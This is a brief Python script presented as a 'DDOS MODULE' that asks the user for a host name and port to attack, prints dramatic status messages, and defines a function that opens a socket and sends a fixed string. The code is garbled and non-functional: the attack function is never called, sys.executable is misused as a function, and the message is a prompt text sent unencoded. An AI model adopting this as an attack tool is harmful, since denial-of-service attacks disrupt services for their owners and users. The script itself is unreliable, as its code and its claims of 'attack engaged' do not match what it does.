# WRITEN BY SOYA

import time
import socket
import os
import sys
import string

def restart_programm():
    python = sys.executable()
    os.execl(python, python, *sys.argv)

curdir = os.getcwd()
print("[!] DDOS MODULE STARTING....")
HOST = str(input("[+] ENTER A HOST NAME TO ATTACK :\n"))
PORT = int(input("[+] ENTER A VALID PORT :\n"))
MESSEAGE = str("[+] ENTER A MESSAGE")
IP= socket.gethostbyname(HOST)
print("["+IP+"]")
print("YOUR IP IS LOCKED")
print("[+] START ATTACKING"+ HOST+"]")

def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((IP, PORT))
        ddos.send(MESSEAGE)
        ddos.sendto(MESSEAGE,(IP, PORT))
    except socket.error:
        print("[+] CONNECTION FAILED")
    print("[!] DDOS ATTACK ENGAGED")
    ddos.close()

print("+------------------+")
print("THE CONNECTION YOU REQUESTED HAD FINISHED")
if __name__=="__main__":
    answar = input("")